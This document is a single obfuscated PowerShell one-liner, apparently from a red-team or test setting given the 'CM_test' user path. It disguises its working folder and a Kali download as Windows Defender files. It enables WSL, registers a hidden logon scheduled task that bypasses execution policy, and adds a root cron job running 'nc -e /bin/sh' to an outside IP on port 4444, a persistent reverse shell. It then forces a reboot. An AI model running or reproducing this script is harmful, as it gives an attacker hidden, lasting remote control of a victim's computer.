$d="C:\Users\CM_test\AppData\Local\Microsoft\WinDef";$en="Enable-WindowsOptionalFeature -N -O -F";$s="New-ScheduledTask";$p="powershell.exe";$e="-Ex Bypass -F ";mkdir $d;cd $d;iex "$en Microsoft-Windows-Subsystem-Linux";iex "$en VirtualMachinePlatform";$a=iex "$s`Action -E '$p' -Ar '-NoP -W H $e`"$d\final_install.ps1`"'";$tr=iex "$s`Trigger -AtL";$f="WinDefv19.20934.00029.appx";Register-ScheduledTask -Ac $a -Tr $tr -TaskN "AppLog" -D "install";$pe="cd `"$d`";wsl --set-default-version 2;iwr -Ur https://aka.ms/wsl-kali-linux -O $f -UseB;Add-AppxPackage .\$f;$p $e$d\installer.ps1";$pe | Out-File 'final_install.ps1';$ins="`$ti=180;`$code={$p $e`C:\Users\CM_test\Desktop\init.ps1};`$j=sajb -S `$code;if (wjb `$j -Timeout `$ti) { rcjb `$j };spjb `$j;rjb `$j;bash -c `"apt update && apt -y install netcat && echo `'* * * * * root nc -e /bin/sh 192.168.149.215 4444`' >> /etc/crontab && service cron restart`"";$ins | Out-File "installer.ps1";$ini="kali";$ini | Out-File "init.ps1";Restart-computer -forc
